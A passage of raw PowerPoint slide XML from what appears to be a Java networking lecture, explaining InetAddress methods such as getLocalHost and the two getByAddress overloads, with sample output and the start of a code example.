                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Returns the local machine's IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </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546226" y="152400"/>
            <a:ext cx="7775575" cy="114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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>getLocalHost </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>method usage example</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="1263073"/>
            <a:ext cx="10058400" cy="364172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400" dirty="0"/>
              <a:t>Operation Results</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>Local IP: 192.168.1.100</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>Local Hostname: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>MyComputer</a:t>
            </a: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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>When the local machine is bound to multiple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IPs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getLocalHost </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>only returns the first </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>. If you want to return all the local </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IPs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>, you can use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getAllByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>method.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" alt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533400" y="909704"/>
            <a:ext cx="10668000" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="q"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>getByAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() method is used to create an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> object from a raw IP address (byte array or String) without performing a DNS lookup. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="q"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is useful when:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You already have the IP in byte form.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You want to avoid DNS resolution (faster, no network dependency).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You need to construct an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> object manually.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="762000" y="255502"/>
            <a:ext cx="5596404" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4. getByAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Method</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="2664030"/>
            <a:ext cx="11658598" cy="3416320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Overloaded Versions:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>→ Creates an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> from a byte array (IPv4: 4 bytes, IPv6: 16 bytes).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>→ This does not setup a hostname (reverse DNS cannot be performed).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>→ Associates a hostname with the IP (useful for reverse lookups later).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="342899" y="3332205"/>
            <a:ext cx="11658599" cy="40011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b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static InetAddress getByAddress(byte[] addr) throws UnknownHostException</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="矩形 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="342899" y="4800600"/>
            <a:ext cx="11658599" cy="707886"/>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b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static InetAddress getByAddress(String host, byte[] addr) throws UnknownHostException</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2000" b="1" dirty="0">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76200" y="1295400"/>
            <a:ext cx="12039600" cy="495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300" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The first overloaded method </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>only needs to pass </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>address in the form of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>a byte </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>array . </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>getByAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>method does not verify whether the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>address exists or not, it simply creates an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>InetAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>object. </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>The length of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>the addr </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>array must be </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>) or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>16 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>IPv6 ). If it is a byte array </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>of other lengths , </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>getByAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>will throw an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>UnknownHostException </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The second overloaded form </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>has an additional </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>host name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>. This </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>host name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>has a different meaning from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>the host name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>the getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>getAllByName methods </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>. This </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>host name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>is just an alias used to represent the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>addr </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>getByAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>method does not use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>the host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>to look up </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>the IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2300" b="1" dirty="0"/>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2300" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="762000" y="457200"/>
            <a:ext cx="5083443" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getByAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Method</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="36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609600" y="152400"/>
            <a:ext cx="7775575" cy="685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lvl="2" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>getByAddress </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>method usage example</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="1143000"/>
            <a:ext cx="11125199" cy="3505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400" dirty="0"/>
              <a:t>The following code demonstrates the use of two overloaded forms of </a:t>
            </a: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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Running results:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="11430000" cy="255454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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.net.*;</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public class</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>MyInetAddress4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>main(String[] args) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>throws </a:t>
            </a:r>
            <a:r>
